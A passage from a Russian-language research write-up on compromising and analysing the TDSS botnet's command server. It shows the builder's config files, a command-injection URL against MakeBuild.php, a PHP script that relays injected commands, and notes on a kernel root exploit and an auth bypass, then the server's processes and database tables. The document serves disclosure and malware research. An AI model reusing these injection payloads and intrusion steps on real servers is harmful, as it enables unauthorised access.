Таким образом, путь к нужному нам для обхода перенаправления файлу был 
по-прежнему неизвестен.</p>

<p>Для файла с настройками перенаправления был составлен и протестирован
 объемный список, содержащий доменные имена и IP-адреса, входящие и 
входившие в ботнет TDSS.</p>

<div class="figure"><pre>/etc/lighttpd/sites-enabled/212.117.162.50.conf
/etc/lighttpd/sites-enabled/212.117.162.1.conf
/etc/lighttpd/sites-enabled/91.212.226.59.conf
/etc/lighttpd/sites-enabled/91.212.226.60.conf
/etc/lighttpd/sites-enabled/91.212.226.61.conf
/etc/lighttpd/sites-enabled/91.212.226.62.conf
/etc/lighttpd/sites-enabled/91.212.226.63.conf
/etc/lighttpd/sites-enabled/91.212.226.64.conf
/etc/lighttpd/sites-enabled/91.212.226.65.conf
/etc/lighttpd/sites-enabled/91.212.226.66.conf
/etc/lighttpd/sites-enabled/91.212.226.67.conf
/etc/lighttpd/sites-enabled/195.24.72.6.conf
/etc/lighttpd/sites-enabled/83.243.8.6.conf
/etc/lighttpd/sites-enabled/server.lu.conf
/etc/lighttpd/sites-enabled/www.server.lu.conf</pre>
<p>Часть списка возможных путей к файлам конфигурации</p>
</div>

<p>Однако желаемый результат был достигнут лишь в результате 
интеллектуального перебора возможных путей вручную. Итак, был найден 
файл конфигурации целевого виртуального сервера: <code>/etc/lighttpd/sites-enabled/engine.conf</code>.</p>

<div class="figure"><pre>$SERVER["socket"] == "91.212.226.63:80" {
        $HTTP["host"] =~ "(.*)?" {
	server.document-root = "/var/www/dm_builder/php/"
#                url.redirect = ( "^/phpmyadmin/(.*)" =&gt; "https://213.133.110.18/phpmyadmin/$1" )
                <strong>url.rewrite-once = ( "^/087dggl094aa/\?aid=(.*)&amp;sid=(.*)$" =&gt; "/MakeBuild.php?aid=$1&amp;sid=$2" )</strong>

		accesslog.filename = "/var/log/lighttpd/build.log"
        }
        server.document-root = "/var/www/dm_builder/php/"
}

$SERVER["socket"] == "212.117.162.50:80" {
        $HTTP["host"] =~ "(.*)?" {
        server.document-root = "/var/www/dm_builder/php/"
#                url.redirect = ( "^/phpmyadmin/(.*)" =&gt; "https://213.133.110.18/phpmyadmin/$1" )
                url.rewrite-once = ( "^/087dggl094aa/\?aid=(.*)&amp;sid=(.*)$" =&gt; "/MakeBuild.php?aid=$1&amp;sid=$2" )
                accesslog.filename = "/var/log/lighttpd/build.log"
        }
        server.document-root = "/var/www/dm_builder/php/"
}

$SERVER["socket"] == "91.212.226.60:443" {
        ssl.engine = "enable"
        ssl.pemfile = "/etc/lighttpd/ssl/chief.pem"
        server.document-root = "/var/www/engine/public"
        server.errorlog = "/var/log/lighttpd/engine_error.log"
        accesslog.filename = "/var/log/lighttpd/engine_access.log"
        <strong>url.rewrite-once = ( "^/(.*)$" =&gt; "/index.php?request=$1" )</strong>
}</pre>
<p>Часть файла <code>engine.conf</code></p>

</div>

<p>Файл конфигурации содержал настройки для шести серверов, только для 
двух из которых были созданы правила перенаправления HTTP-запросов на 
файл <code>index.php</code>. Для остальных серверов осуществлялось перенаправление HTTPS-запросов на скрипт <code>MakeBuild.php</code>.</p>

<p>Анализ скрипта <code>MakeBuild.php</code> с помощью последнего из 
разработанных эксплойтов показал, что в его задачи входит сборка и 
конфигурация исполняемого файла руткита TDSS. Скрипт принимает на вход 
несколько параметров, один из которых предоставляет собой отладочную 
информацию о сборке трояна.</p>

<div class="figure">
<pre>&lt;?
if (!isset($_GET['aid'])) exit();
$AID=$_GET['aid'];
$SID=$_GET['sid'];
if (empty($SID)) $SID=0;

$DBG=$_GET['dbg'];
$ENC=$_GET['enc'];

/*if ($AID == 20034 || $AID == 20124)
{
	$url = "http://213.133.110.18/03kd7nml094hx09/?aid={$AID}&amp;sid={$SID}";
	if ($ENC) $url .= "&amp;enc={$ENC}";
	if ($DBG) $url .= "&amp;dbg={$DBG}";
	header("HTTP/1.1 302 Found");
	header("Location: {$url}");
	exit();
}*/

$BuildPath="./builds/{$AID}-{$SID}.exe";
$ExitStatus=null;


<strong>if(!chdir('/var/www/builder/')) exit();//exit('Error: Can\'t ChDir');
exec("/usr/bin/wine builder.exe {$AID} {$SID}",$OutPut,$ExitStatus);
if ($DBG)
{
unlink($BuildPath);
echo "&lt;html&gt;&lt;pre&gt;\n+------------------------------+\n"; print_r($OutPut); echo "\n=------------------------------=\n"; exit('Builder exit status: '.$ExitStatus);
}</strong></pre>
<p>Часть скрипта <code>MakeBuild.php</code></p>
</div>

<p>Скрипт <code>MakeBuild.php</code> оказался уязвимым к атаке на 
удаленное исполнение кода (remote code execution). В частности, как 
видно из листинга, входные параметры скрипта не фильтруются, а 
передаются напрямую в функцию <code>exec()</code>. Дополнительно, если использовать параметр <code>dbg</code> в запросе к скрипту, то в отладочном выводе будет напечатан результат выполнения команды.</p>

<p>В результате выполнения следующего запроса выводится список файлов в текущей директории:</p>

<pre class="oneliner">http://91.212.226.63/087dggl094aa/MakeBuild.php?aid=;ls;&amp;dbg=1</pre>

<p>Через эту уязвимость на сервер был загружен скрипт для удаленного управления.</p>

<h3 id="s7">Повышение привилегий</h3>

<p>Права <code>root</code> на сервере были получены с помощью эксплойта для уязвимости <code>sock_sendpage()</code>, который потребовал небольшой модификации для обеспечения его выполнения в 64-битной операционной системе сервера.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/16.jpg" width="800" height="353" alt="Директория /root на командном сервере сервере TDSS"><p>Директория <code>/root</code> на командном сервере сервере TDSS</p></div>

<h3 id="s8">Панель управления</h3>

<p>Настройки для панели управления ботнетом содержались в файле <code>engine_admin.conf</code>, расположенном в той же директории, что и файл <code>engine.conf</code>.</p>

<div class="figure">
<pre>$SERVER["socket"] == "91.212.226.59:443" {
        ssl.engine = "enable"
        ssl.pemfile = "/etc/lighttpd/ssl/chief.pem"
#        $HTTP["host"] =~ "^engineadmin\.com$" {
                server.document-root = "/var/www/engine/tools/public"
                server.errorlog = "/var/log/lighttpd/admin.engine_error.log"
                accesslog.filename = "/var/log/lighttpd/admin.engine_access.log"

                url.rewrite-once = ( "^/([0-9a-zA-Z/]+)/?\??(.*=.*)?$" =&gt; "/index.php?request=$1&amp;$2" )

                $HTTP["url"] =~ "^/" {
                        auth.backend = "htpasswd"
                        auth.backend.htpasswd.userfile = "/etc/lighttpd/htpasswd.engine"
                        auth.require = (
                                "/" =&gt; (
                                        "method" =&gt; "basic",
                                        "realm" =&gt; "Use your credit card number as username, cvv2 as password. Thank you ;)",
                                        "require" =&gt; "valid-user"
                                )
                        )
                }

#        }
}</pre>
<p>Содержимое файла <code>engine_admin.conf</code></p>

</div>

<p>Как видно из файла, адрес панели администрирования — 91.212.226.59. 
Однако открыть этот адрес в веб-браузере не удавалось: наш IP-адрес не 
входил в «белый список» доступа. Обойти эту защиту позволила модификация
 правил фаервола, описанных в файле <code>/root/ipt.rules</code>.</p>

<div class="figure">
<pre>-A INPUT -i lo -j ACCEPT 
-A INPUT -s 66.148.74.126/32 -p tcp -m tcp -m multiport --dports 22,443,80,873,3306 -j ACCEPT 
-A INPUT -s 188.40.72.68/32 -p tcp -m tcp -m multiport --dports 22,443,80,873,3306 -j ACCEPT
-A INPUT -s 188.40.72.125/32 -p tcp -m tcp -m multiport --dports 22,443,80,873,3306 -j ACCEPT
-A INPUT -s 204.12.213.144/29 -p tcp -m tcp -m multiport --dports 22,443,80,873,3306 -j ACCEPT
-A INPUT -s 91.212.226.49/32 -p tcp -m tcp -m multiport --dports 22,443,80,873,3306 -j ACCEPT
-A INPUT -d 212.117.162.50/32 -p tcp -m tcp -m multiport --dports 443,80 -j REJECT --reject-with icmp-port-unreachable 
-A INPUT -d 91.212.226.59/32 -p tcp -m tcp -m multiport --dports 443,80 -j REJECT --reject-with icmp-port-unreachable
-A INPUT -i eth0 -p tcp -m tcp -m multiport --dports 3306 -j REJECT --reject-with icmp-port-unreachable 
-A INPUT -s 195.138.81.135/32 -p tcp -m tcp --dport 22 -j ACCEPT 
-A INPUT -i eth0 -p tcp -m tcp --dport 873 -j REJECT --reject-with icmp-port-unreachable 
-A INPUT -i eth0 -p tcp -m tcp --dport 22 -j REJECT --reject-with icmp-port-unreachable 
COMMIT</pre>
<p>Изначальное содержимое файла <code>ipt.rules</code></p>
</div>

<p>Таким образом, доступ к сайту панели управления был получен, но для 
входа в панель требовалась стандартная авторизация (Basic 
Authorisation). Пароли для входа хранились в файле <code>htpasswd.engine</code> в зашифрованном виде. Но, вместо подбора паролей, для первого доступа мы подменили файл <code>htpasswd.engine</code>
 целиком. Позже выяснилось, что логины и пароли к панели управления 
хранились в базе данных без шифрования, что позволило использовать их 
для дальнейшего доступа.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/19.jpg" width="800" height="317" alt="Запрос авторизации при входе в административную панель"><p>Запрос авторизации при входе в административную панель</p></div>

<p>Панель администрирования командного сервера ботнета представляла 
собой удобный веб-интерфейс для получения подробной статистики о 
зараженных компьютерах. Стоит отметить такие возможности, как 
отображение информации о количестве загрузок, статистика по странам, 
операционным системам и веб-браузерам зараженных компьютеров, просмотр 
подгружаемых модулей и запущенных на выполнение команд.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/20.jpg" width="800" height="370" alt="Статистика числа заражений по дням"><p>Статистика числа заражений по дням</p></div>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/21.jpg" width="687" height="404" alt="Статистика по операционным системам"><p>Статистика по операционным системам</p></div>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/22.jpg" width="800" height="237" alt="Запущенные на выполнение команды"><p>Запущенные на выполнение команды</p></div>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/23.jpg" width="800" height="700" alt="Статистика по странам"><p>Статистика по странам</p></div>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/24.jpg" width="800" height="357" alt="Модули TDSS"><p>Модули TDSS</p></div>

<h3 id="s9">Смена серверов</h3>

Тем временем начала распространяться новая версия бота TDSS (3.64). В этой версии сменились адреса командных серверов.

<pre>[tdlcmd]
servers=https://a57990057.cn/;https://a58990058.cn/;https://94.228.209.145/
wspservers=http://c36996639.cn/;http://c58446658.cn/
popupservers=http://m2121212.cn/</pre>

<div class="aside"><p><strong>Фронтенд (front-end)</strong> — 
дополнительный HTTP-сервер для выдачи статического содержимого сайта. 
Используется в целях оптимизации ресурсов веб-серверов с высокой 
нагрузкой.</p></div>

<p>Скрипты новых серверов претерпели некоторые изменения. В частности, 
была исправлена уязвимость с выводом ошибки при неверном GET-запросе к 
серверу. Но, поскольку все остальные найденные ранее уязвимости успешно 
функционировали, то было возможно прочитать файл <code>index.php</code>.
 Его код оказался доработан: теперь все исключения записывались в файл 
лога. Настройки сервера также претерпели изменения. В частности, в 
дополнение к HTTP-серверу <code>lighttpd</code> в качестве <em>фронтенда</em> был установлен дополнительный веб-сервер nginx.</p>

<p>Конфигурацонный файл виртуальных серверов на новом сервере остался прежним: <code>engine.conf</code>.</p>

<p>Таким образом, панель администрирования сервера теперь располагалась 
по адресу 188.72.242.191, а наш скрипт удаленного управления остался на 
сервере с по адресу 188.72.242.190. Как видно из листинга, каждому 
IP-адресу соответствует отдельное доменное имя. Возможность 
использования «чёрного хода» оказалась недоступна. Для обхода этого 
ограничения был разработан следующий скрипт:</p>

<div class="figure">
<pre>&lt;?php

$fp = fsockopen("ssl://94.228.209.145",443,$errno,$errstr);
if(!$fp) die("[e] $errno,$errstr");
$header  = "GET /MakeBuild.php?aid=;".urlencode($argv[1]).";&amp;dbg=1 HTTP/1.1\r\n";
$header .= "Host: bld.newnetengine.com\r\n";
$header .= "Connection: close\r\n\r\n";

fwrite($fp,$header);
while(!feof($fp)) print(fgets($fp,256));
fclose($fp);

print $buff;</pre>
<p>Скрипт для выполнения команд на новом сервере через файл <code>MakeBuild.php</code></p>
</div>

<p>Данный скрипт обеспечивает отправку запроса к скрипту <code>MakeBuild.php</code> путем подстановки доменного имени сервера, на котором хранится файл скрипта (<code>bld.newnetengine.com</code>), в поле <code>Host</code>
 HTTP-запроса. Получив такой запрос, HTTP-сервер nginx на командном 
сервере перенаправлял его на указанный сервер и возвращал ответ.</p>

<h2 id="s10">Часть 2. Анализ</h2>

<p>Командный сервер ботнета работает под управлением 64-разрядной операционной системы Ubuntu Linux:</p>

<pre># uname -a
Linux C020 2.6.29.2 #1 SMP Sun Jul 26 11:29:05 CEST 2009 x86_64 GNU/Linux 
# cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=9.04
DISTRIB_CODENAME=jaunty
DISTRIB_DESCRIPTION="Ubuntu 9.04"</pre>

<p>Для сетевого интерфейса eth0 назначено 10 IP-адресов:</p>

<pre># ifconfig
eth0      Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:212.117.162.50  Bcast:212.117.162.255  Mask:255.255.255.0
          inet6 addr: fe80::221:85ff:fe63:2c55/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:8401814139 errors:0 dropped:0 overruns:0 frame:0
          TX packets:7557368326 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:855626520252 (855.6 GB)  TX bytes:4595270022127 (4.5 TB)
          Interrupt:17 Base address:0x2000 

eth0:1    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.59  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:2    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.60  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:3    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.61  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:4    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.62  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:5    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.63  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:6    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.64  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:7    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.65  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:8    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.66  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

eth0:9    Link encap:Ethernet  HWaddr 00:21:85:63:2c:55  
          inet addr:91.212.226.67  Bcast:91.255.255.255  Mask:255.255.255.255
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          Interrupt:17 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:10295737718 errors:0 dropped:0 overruns:0 frame:0
          TX packets:10295737718 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:3644745121946 (3.6 TB)  TX bytes:3644745121946 (3.6 TB)</pre>

<p>Из них четыре (91.212.226.60, 91.212.226.61, 91.212.226.62 и 
91.212.226.64) используются для доступа к веб-шлюзу, с которым работают 
боты, два (91.212.226.63 и 212.117.162.50) — для доступа к 
веб-интерфейсу для сборки и конфигурации бота, и один (91.212.226.59) — 
для доступа к панели администрирования ботнета.</p>

<div class="figure"><img src="TDSS%20%D0%BF%D0%BE%D0%BB%D0%BD%D0%BE%D0%B5%20%D1%80%D0%B0%D1%81%D0%BA%D1%80%D1%8B%D1%82%D0%B8%D0%B5_files/shadow.png" width="449" height="488" alt="Учетные записи локальных пользователей в файле /etc/shadow"><p>Учетные записи локальных пользователей в файле <code>/etc/shadow</code></p></div>

<p>Список запущенных процессов на сервере на момент анализа выглядел следующим образом:</p>

<pre>  PID TTY      STAT   TIME COMMAND
 1076 ?        S&lt;s    0:04 /sbin/udevd --daemon
 1575 ?        S    1154:22 /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
 2453 ?        Ss     0:00 /sbin/mdadm --monitor --pid-file /var/run/mdadm/monitor.pid --daemonise --scan --syslog
 3801 tty2     Ss+    0:00 /sbin/getty 38400 tty2
 3826 ?        Ss     0:16 /sbin/syslogd -u syslog
 3845 ?        S      0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
 3848 ?        Ss     0:00 /sbin/klogd -P /var/run/klogd/kmsg
 3890 ?        Ss     1:54 /bin/dbus-daemon --system
 3936 ?        Ssl   69:36 /usr/sbin/named -u bind
 3973 ?        Ss     0:01 /usr/sbin/ntpd -p /var/run/ntpd.pid -u 108:117 -g
 3986 ?        Ss     0:01 /usr/sbin/sshd
 3991 ?        Sl   1736:18 /usr/bin/memcached -m 2048 -p 11211 -u nobody -l 127.0.0.1
 4067 ?        Ss     0:00 /usr/lib/postfix/master
 4084 ?        S      0:00 qmgr -l -t fifo -u
 4086 ?        Ss     0:00 /usr/sbin/winbindd
 4113 ?        S      0:00 /usr/sbin/winbindd
 4118 ?        Ss    86:34 avahi-daemon: running [C020.local]
 4119 ?        Ss     0:00 avahi-daemon: chroot helper
 4134 ?        S      0:00 /usr/bin/rsync --no-detach --daemon --config /etc/rsyncd.conf
 4185 ?        Ss     0:03 /usr/sbin/cron
 4220 tty1     Ss+    0:00 /sbin/getty 38400 tty1
 4225 ?        Ssl   36:54 /usr/sbin/console-kit-daemon
 4436 ?        S&lt;   223:30 [loop3]
 4465 ?        S&lt;    72:26 [kjournald2]
 4498 ?        S      0:00 /bin/sh /usr/bin/mysqld_safe
 4728 ?        SLl  87943:36 /usr/sbin/mysqld
 6773 ?        S      0:39 /usr/bin/php-cgi
 7303 ?        S      0:32 /usr/bin/php-cgi
 7320 ?        S      0:31 /usr/bin/php-cgi
 7447 ?        S      0:27 /usr/bin/php-cgi
 7590 ?        S      0:25 /usr/bin/php-cgi
 7796 ?        S      0:19 /usr/bin/php-cgi
 7944 ?        S      0:16 /usr/bin/php-cgi
 7982 ?        S      0:15 /usr/bin/php-cgi
 8002 ?        S      0:00 /USR/SBIN/CRON
 8048 ?        Ss     0:00 /bin/sh -c /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildslife.php
 8058 ?        S      0:05 /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildslife.php
 8243 ?        S      0:00 /USR/SBIN/CRON
 8282 ?        Ss     0:00 /bin/sh -c /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildsmlife.php
 8287 ?        S      0:06 /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildsmlife.php
 8467 ?        S      0:00 /USR/SBIN/CRON
 8483 ?        Ss     0:00 /bin/sh -c /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildswlife.php
 8484 ?        S      0:03 /usr/bin/php /var/www/engine/cron/affiliatesstatisticsbuildswlife.php
 8637 ?        S      0:00 pickup -l -t fifo -u -c
 8812 ?        S      0:30 /usr/bin/php-cgi
 8903 ?        S      0:26 /usr/bin/php-cgi
 8937 ?        S      0:18 /usr/bin/php-cgi
 8966 ?        S      0:17 /usr/bin/php-cgi
 8971 ?        S      0:16 /usr/bin/php-cgi
 9057 ?        S      0:08 /usr/bin/php-cgi
 9081 ?        S      0:05 /usr/bin/php-cgi
 9249 ?        S      0:03 /usr/bin/php-cgi
 9299 ?        S      0:00 sh -c ps ax
 9300 ?        R      0:00 ps ax
26004 ?        S      0:00 [pdflush]
26007 ?        S      0:01 [pdflush]
27746 ?        Ss     0:00 ssh-agent
28031 ?        Ss     0:01 /usr/bin/php-cgi
28042 ?        Ss     0:03 /usr/bin/php-cgi</pre>

<h3 id="s11">База данных и скрипты</h3>

<p>В качестве СУБД на сервере используется MySQL, а в качестве 
веб-сервера — LightTPD, к которому в качестве обработчика CGI-приложений
 подключен пакет PHP. Кроме того, часть данных, обращения к которым 
производятся наиболее часто, кэшируются в памяти с помощью программы <a href="https://web.archive.org/web/20180310124741/http://memcached.org/">memcached</a>.</p>

<p>Скрипты панели администрирования и шлюза для ботов находятся в директории <code>/var/www/engine</code>, которая имеет следующую структуру:</p>

<pre>+--- cron              - PHP-скрипты, исполняемые по расписанию
+--- data              - база адресов GeoIP и некоторые текстовые файлы
+--- library           - различные библиотеки PHP, используемые скриптами
+--- public            - скрипты, обрабатывающие запросы от ботов
|                        (корневая директория веб-сервера, обслуживающего ботов)
\--- tools
|    +--- controllers  - PHP-скрипты для различных страниц панели администрирования
|    +--- layouts      - главный HTML-шаблон для панели администрирования
|    +--- public       - основные скрипты панели администрирования 
|    |                   (корневая директория веб-сервера, обслуживающего панель администрирования)
|    +--- views        - HTML-шаблоны-для различных страниц панели администрирования
+--- configuration.php - файл настроек доступа к базе данных и т.п.</pre>

<p>На момент получения доступа к серверу база данных содержала 47 таблиц
 с общим количеством записей порядка 17&nbsp;719&nbsp;469 и занимала на 
диске примерно 2,6 ГБ.</p>

<p>Имена и назначения таблиц:</p>

<table class="data">
<colgroup><col width="30%">
<col width="15%">
<col width="15%">
<col width="40%">
<col>
<col>
<col>
</colgroup><thead>
<tr>
<td>Имя таблицы</td>
<td>Число записей</td>
<td>Объём данных</td>
<td>Назначение</td>

</tr>
</thead>
<tbody>
<tr>
<td><code>affiliates</code></td>
<td class="num">512</td>
<td class="num">80,0 кБ</td>
<td rowspan="9">Учётные записи партнёров и статистика по ним</td>
</tr>
<tr>
<td><code>affiliatesaccounts</code></td>
<td class="num">607</td>

<td class="num">64,0 кБ</td>
</tr>
<tr>
<td><code>affiliatesregistrations</code></td>
<td class="num">507</td>
<td class="num">64,0 кБ</td>
</tr>
<tr>
<td><code>affiliatesstatistics</code></td>
<td class="num">≈ 62&nbsp;136</td>

<td class="num">8,5 МБ</td>
</tr>
<tr>
<td><code>affiliatesstatisticsbrowser</code></td>
<td class="num">≈ 53&nbsp;072</td>
<td class="num">7,1 МБ</td>
</tr>
<tr>
<td><code>affiliatesstatisticsbuild</code></td>
<td class="num">≈ 5&nbsp;979&nbsp;072</td>

<td class="num">655,8 МБ</td>
</tr>
<tr>
<td><code>affiliatesstatisticscountry</code></td>
<td class="num">≈ 245&nbsp;253</td>
<td class="num">26,1 МБ</td>
</tr><tr>
<td><code>affiliatesstatisticssts</code></td>
<td class="num">63</td>
<td class="num">3,3 кБ</td>

</tr>
<tr>
<td><code>affiliatesstatisticssystem</code></td>
<td class="num">≈ 56&nbsp;982</td>
<td class="num">7,1 мБ</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>bots</code></td>
<td class="num">≈ 5&nbsp;247&nbsp;199</td>

<td class="num">1,4 ГБ</td>
<td>Основная таблица с информацией о ботах</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>browsers</code></td>
<td class="num">3&nbsp;690</td>
<td class="num">240,0 кБ</td>
<td rowspan="4">Дополнительная информация о ботах (версии веб-браузеров, версии руткита и модуля <code>TDLCMD.DLL</code>, страна, версия операционной системы)</td>

</tr>
<tr>
<td><code>builds</code></td>
<td class="num">172</td>
<td class="num">16,0 кБ</td>
</tr>
<tr>
<td><code>countries</code></td>
<td class="num">253</td>
<td class="num">16,0 кБ</td>
</tr>

<tr>
<td><code>systems</code></td>
<td class="num">101</td>
<td class="num">16,0 кБ</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>commands</code></td>
<td class="num">55</td>
<td class="num">16,0 кБ</td>

<td rowspan="5">Команды ботам, статистика по ним, история команд и дополнительные параметры</td>
</tr>
<tr>
<td><code>commandsexecuted</code></td>
<td class="num">≈ 4&nbsp;546&nbsp;977</td>
<td class="num">337,5 МБ</td>
</tr>
<tr>
<td><code>commandshistory</code></td>
<td class="num">1&nbsp;590</td>

<td class="num">224,0 кБ)</td>
</tr>
<tr>
<td><code>commandsinfo</code></td>
<td class="num">55</td>
<td class="num">64,0 кБ</td>
</tr>
<tr>
<td><code>commandsproperties</code></td>
<td class="num">909</td>
<td class="num">64,0 кБ</td>

</tr>
</tbody>
<tbody>
<tr>
<td><code>modules</code></td>
<td class="num">13</td>
<td class="num">400,0 кБ</td>
<td>Исполняемые модули для ботов</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>redirects</code></td>

<td class="num">0</td>
<td class="num">—</td>
<td rowspan="2">URL-перенаправления</td>
</tr>
<tr>
<td><code>redirectsexecuted</code></td>
<td class="num">0</td>
<td class="num">—</td>
</tr>
</tbody>
<tbody>

<tr>
<td><code>remover_bho</code></td>
<td class="num">6&nbsp;050</td>
<td class="num">1,5 МБ</td>
<td rowspan="11">Статистика модуля <code>remover</code></td>
</tr>
<tr>
<td><code>remover_bho_stat</code></td>
<td class="num">20</td>

<td class="num">1,9 кБ</td>
</tr>
<tr>
<td><code>remover_dda</code></td>
<td class="num">642</td>
<td class="num">144,0 кБ</td>
</tr>
<tr>
<td><code>remover_dda_stat</code></td>
<td class="num">21</td>
<td class="num">1,9 кБ</td>

</tr>
<tr>
<td><code>remover_dir</code></td>
<td class="num">≈ 37&nbsp;991</td>
<td class="num">7,5 МБ</td>
</tr>
<tr>
<td><code>remover_dir_stat</code></td>
<td class="num">20</td>
<td class="num">1,9 кБ</td>

</tr>
<tr>
<td><code>remover_errors</code></td>
<td class="num">18&nbsp;914</td>
<td class="num">2,5 МБ</td>
</tr>
<tr>
<td><code>remover_extra</code></td>
<td class="num">≈ 289&nbsp;449</td>
<td class="num">54,6 МБ</td>

</tr>
<tr>
<td><code>remover_extra_stat</code></td>
<td class="num">18</td>
<td class="num">1,9 кБ</td>
</tr>
<tr>
<td><code>remover_guid</code></td>
<td class="num">≈ 21&nbsp;220</td>
<td class="num">4,5 МБ</td>

</tr>
<tr>
<td><code>remover_guid_stat</code></td>
<td class="num">20</td>
<td class="num">1,9 кБ</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>rules</code></td>
<td class="num">0</td>
<td class="num">—</td>

<td rowspan="2">Неизвестно</td>
</tr>
<tr>
<td><code>ruleshistory</code></td>
<td class="num">0</td>
<td class="num">—</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>statuses</code></td>
<td class="num">1&nbsp;982</td>

<td class="num">72,3 кБ</td>
<td rowspan="3">Неизвестно</td>
</tr>
<tr>
<td><code>statuses_limits</code></td>
<td class="num">1&nbsp;138&nbsp;919</td>
<td class="num">115,0 МБ</td>
</tr>
<tr>
<td><code>statuses_statistics</code></td>

<td class="num">3&nbsp;956</td>
<td class="num">102,8 кБ</td>
</tr>
</tbody>
<tbody>
<tr>
<td><code>users</code></td>
<td class="num">10</td>
<td class="num">16,0 кБ</td>
<td>Учётные записи пользователей панели управления</td>

</tr>
</tbody>
</table>

<p>Далее будет приведена структура наиболее интересных таблиц и некоторые пояснения, касающиеся работы с ними.</p>

<h3 id="s12">Запросы от ботов к серверу</h3>

<p>Сразу после инсталляции бот инициирует запрос команд от сервера и 
повторяет этот запрос через заданный в конфигурации интервал времени. 
Запросы бота, как уже было описано в первой части статьи, шифруются по 
алгоритму RC4 с использованием имени целевого сервера в качестве ключа, 
затем кодируются по алгоритму base64 и отправляются на веб-шлюз 
командного сервера по протоколу HTTPS.</p>

<p>Формат запросов на получение команд может отличаться от одной версии 
бота к другой. Для большинства версий, включая самые последние, запрос 
выглядит следующим образом:</p>

<pre class="oneliner">bot_ID|aff_ID|aff_SID|rootkit_ver|tdlcmd_ver|os_ver|lang|browser|build_date|install_date</pre>

<p>Назначение полей запроса:</p>

<table class="text">
<colgroup><col width="25%">
<col width="75%">
</colgroup><thead>
<tr>
<td>Поле</td>
<td>Назначение</td>
</tr>
</thead>
<tbody>
<tr>

<td><code>bot_ID</code></td>
<td>Уникальный идентификатор бота, например, <code>7a91eb86-a6be-4db5-8694-0337dad2c75d</code></td>
</tr>
<tr>
